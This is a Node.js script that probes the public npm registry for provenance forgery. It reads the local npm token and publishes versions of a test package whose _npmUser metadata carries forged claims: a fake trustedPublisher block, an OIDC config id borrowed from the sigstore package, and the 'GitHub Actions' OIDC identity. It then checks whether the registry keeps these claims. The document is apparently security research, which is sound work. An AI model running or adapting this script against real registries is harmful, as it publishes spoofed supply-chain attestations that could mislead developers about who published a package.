#!/usr/bin/env node
// _npmUser.trustedPublisher injection probes.
//
// When a package is published via OIDC (e.g. GitHub Actions), the registry attaches
// _npmUser.trustedPublisher = { id: "github", oidcConfigId: "oidc:<uuid>" }. This is
// a stronger attestation than a regular granular-token publish.
//
// Question: if I publish via a granular token but stuff trustedPublisher into the
// publish body, does the registry strip it (good defense) or preserve it (attestation
// forgery)?
//
// Probes:
//   A — granular-token publish + fake trustedPublisher (claim github OIDC)
//   B — granular-token publish + nested trustedPublisher claiming a real-looking oidcConfigId
//       (we use a known oidcConfigId from a real package — sigstore — to test whether the
//       registry checks the OIDC config matches the publishing identity)
//   C — try claiming "name": "GitHub Actions" + "email": "npm-oidc-no-reply@github.com"
//       (the canonical OIDC identity) without trustedPublisher
//   D — combine all three: full OIDC identity + trustedPublisher block

import crypto from 'node:crypto'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { execSync } from 'node:child_process'

const REGISTRY = 'https://registry.npmjs.org'
const PKG = 'ghostpublish'
const TS = Math.floor(Date.now() / 1000)

// Real OIDC config id observed on a public package (sigstore@4.1.0). Using this to
// test whether the registry validates the binding between the OIDC config and the
// publishing identity.
const REAL_BUT_UNRELATED_OIDC_ID = 'oidc:a123e7c7-98a7-4464-911d-09fa7c394dd1'
const FAKE_OIDC_ID = 'oidc:00000000-0000-0000-0000-000000000000'

function readToken() {
  for (const p of [path.resolve('.npmrc'), path.join(os.homedir(), '.npmrc')]) {
    try {
      const text = fs.readFileSync(p, 'utf8')
      const m = text.match(/_authToken=([A-Za-z0-9_-]+)/)
      if (m) return m[1].trim()
    } catch {}
  }
  throw new Error('No npm auth token found')
}
const token = readToken()

function buildTarball(version) {
  const stagingDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gh-tpprobe-'))
  const pkgDir = path.join(stagingDir, 'package')
  fs.mkdirSync(pkgDir)
  fs.writeFileSync(
    path.join(pkgDir, 'package.json'),
    JSON.stringify({ name: PKG, version, license: 'MIT', main: 'index.js' }, null, 2),
  )
  fs.writeFileSync(path.join(pkgDir, 'index.js'), `module.exports = { ts: ${TS} };\n`)
  const tarballPath = path.join(stagingDir, `${PKG}-${version}.tgz`)
  execSync(`tar --no-xattrs --format=ustar -czf "${tarballPath}" -C "${stagingDir}" package`, { stdio: 'inherit' })
  const buf = fs.readFileSync(tarballPath)
  return {
    buf,
    sha1: crypto.createHash('sha1').update(buf).digest('hex'),
    integrity: `sha512-${crypto.createHash('sha512').update(buf).digest('base64')}`,
  }
}

async function publish(name, manifestExtras) {
  const version = `1.0.0-tpprobe-${name}-${TS}`
  const { buf, sha1, integrity } = buildTarball(version)
  const tgzName = `${PKG}-${version}.tgz`

  const versionManifest = {
    name: PKG,
    version,
    license: 'MIT',
    main: 'index.js',
    _id: `${PKG}@${version}`,
    dist: {
      tarball: `${REGISTRY}/${PKG}/-/${tgzName}`,
      shasum: sha1,
      integrity,
    },
    ...manifestExtras,
  }

  const body = {
    _id: PKG,
    name: PKG,
    description: `trusted-publisher probe: ${name}`,
    'dist-tags': { [`tpprobe-${name}`]: version },
    versions: { [version]: versionManifest },
    _attachments: {
      [tgzName]: {
        content_type: 'application/octet-stream',
        data: buf.toString('base64'),
        length: buf.length,
      },
    },
  }

  const t0 = Date.now()
  const res = await fetch(`${REGISTRY}/${PKG}`, {
    method: 'PUT',
    headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json', accept: '*/*' },
    body: JSON.stringify(body),
  })
  const text = await res.text()
  return { version, res, text, elapsed: Date.now() - t0 }
}

async function readManifest(version) {
  const r = await fetch(`${REGISTRY}/${PKG}/${version}`, { headers: { accept: 'application/json' } })
  if (!r.ok) return { ok: false, status: r.status, body: await r.text() }
  return { ok: true, manifest: await r.json() }
}

const REPORT = []
function record(probe, sentSummary, storedSummary, verdict, putStatus) {
  REPORT.push({ probe, sentSummary, storedSummary, verdict, putStatus })
}
function logHeader(t) { console.log('\n' + '='.repeat(72) + '\n' + t + '\n' + '='.repeat(72)) }
function sleep(ms) { return new Promise((r) => setTimeout(r, ms)) }

// ---- Probe A: trustedPublisher with fake oidcConfigId ----
{
  logHeader('PROBE A — fake _npmUser.trustedPublisher (granular token)')
  const out = await publish('fake-tp', {
    _npmUser: {
      name: 'PROBE_FAKE_npmUser',
      email: 'probe@example.invalid',
      trustedPublisher: { id: 'github', oidcConfigId: FAKE_OIDC_ID },
    },
  })
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  await sleep(2000)
  const m = await readManifest(out.version)
  if (m.ok) {
    console.log(`  manifest._npmUser: ${JSON.stringify(m.manifest._npmUser)}`)
    const tp = m.manifest._npmUser?.trustedPublisher
    const verdict = !tp ? 'STRIPPED — no trustedPublisher in stored _npmUser'
      : tp.oidcConfigId === FAKE_OIDC_ID ? '*** ATTESTATION SPOOFING — fake oidcConfigId ACCEPTED ***'
      : 'OVERRIDDEN — different trustedPublisher stored'
    record('trustedPublisher fake oidcConfigId', `id=github, oidcConfigId=${FAKE_OIDC_ID}`, JSON.stringify(tp || '<absent>'), verdict, out.res.status)
  } else {
    record('trustedPublisher fake oidcConfigId', 'fake', '<error>', `REJECTED: ${m.status}`, out.res.status)
  }
}

// ---- Probe B: trustedPublisher claiming a REAL oidcConfigId from another package ----
{
  logHeader("PROBE B — trustedPublisher with a real-but-unrelated oidcConfigId (sigstore's)")
  const out = await publish('real-tp', {
    _npmUser: {
      name: 'PROBE_FAKE_npmUser',
      email: 'probe@example.invalid',
      trustedPublisher: { id: 'github', oidcConfigId: REAL_BUT_UNRELATED_OIDC_ID },
    },
  })
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  await sleep(2000)
  const m = await readManifest(out.version)
  if (m.ok) {
    console.log(`  manifest._npmUser: ${JSON.stringify(m.manifest._npmUser)}`)
    const tp = m.manifest._npmUser?.trustedPublisher
    const verdict = !tp ? 'STRIPPED'
      : tp.oidcConfigId === REAL_BUT_UNRELATED_OIDC_ID ? "*** CRITICAL — claimed sigstore's oidcConfigId, accepted ***"
      : 'OVERRIDDEN'
    record('trustedPublisher real-other oidcConfigId', `oidcConfigId=${REAL_BUT_UNRELATED_OIDC_ID}`, JSON.stringify(tp || '<absent>'), verdict, out.res.status)
  } else {
    record('trustedPublisher real-other oidcConfigId', 'real-other', '<error>', `REJECTED: ${m.status}`, out.res.status)
  }
}

// ---- Probe C: claim canonical OIDC identity (name/email only, no trustedPublisher) ----
{
  logHeader('PROBE C — claim "GitHub Actions" identity (without trustedPublisher)')
  const out = await publish('oidc-name', {
    _npmUser: { name: 'GitHub Actions', email: 'npm-oidc-no-reply@github.com' },
  })
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  await sleep(2000)
  const m = await readManifest(out.version)
  if (m.ok) {
    console.log(`  manifest._npmUser: ${JSON.stringify(m.manifest._npmUser)}`)
    const u = m.manifest._npmUser
    const verdict = u?.name === 'GitHub Actions' && u?.email === 'npm-oidc-no-reply@github.com' ? '*** IDENTITY SPOOFED ***' : 'OVERRIDDEN'
    record('OIDC identity claim (no tp)', '{name:"GitHub Actions", email:"npm-oidc-no-reply@github.com"}', JSON.stringify(u), verdict, out.res.status)
  } else {
    record('OIDC identity claim', 'oidc id', '<error>', `REJECTED: ${m.status}`, out.res.status)
  }
}

// ---- Probe D: claim full OIDC identity + trustedPublisher ----
{
  logHeader('PROBE D — full OIDC identity claim + trustedPublisher')
  const out = await publish('full-oidc', {
    _npmUser: {
      name: 'GitHub Actions',
      email: 'npm-oidc-no-reply@github.com',
      trustedPublisher: { id: 'github', oidcConfigId: REAL_BUT_UNRELATED_OIDC_ID },
    },
  })
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  await sleep(2000)
  const m = await readManifest(out.version)
  if (m.ok) {
    console.log(`  manifest._npmUser: ${JSON.stringify(m.manifest._npmUser)}`)
    const u = m.manifest._npmUser
    const tp = u?.trustedPublisher
    const fullSpoof = u?.name === 'GitHub Actions' && tp?.oidcConfigId === REAL_BUT_UNRELATED_OIDC_ID
    const verdict = fullSpoof ? '*** FULL OIDC SPOOF — name + email + trustedPublisher all accepted ***'
      : !tp && u?.name !== 'GitHub Actions' ? 'FULLY OVERRIDDEN'
      : tp ? 'PARTIALLY ACCEPTED'
      : 'IDENTITY SPOOFED but trustedPublisher stripped'
    record('full OIDC + trustedPublisher', 'full claim', JSON.stringify(u), verdict, out.res.status)
  } else {
    record('full OIDC + trustedPublisher', 'full claim', '<error>', `REJECTED: ${m.status}`, out.res.status)
  }
}

// ---- Summary ----
logHeader('SUMMARY')
console.log()
console.log('| Probe                                    | PUT  | Verdict |')
console.log('|------------------------------------------|------|---------|')
for (const r of REPORT) {
  console.log(`| ${r.probe.padEnd(40)} | ${String(r.putStatus).padEnd(4)} | ${r.verdict} |`)
}
console.log()
console.log('Detail:')
for (const r of REPORT) {
  console.log(`  [${r.probe}]`)
  console.log(`    sent:   ${r.sentSummary}`)
  console.log(`    stored: ${r.storedSummary}`)
}
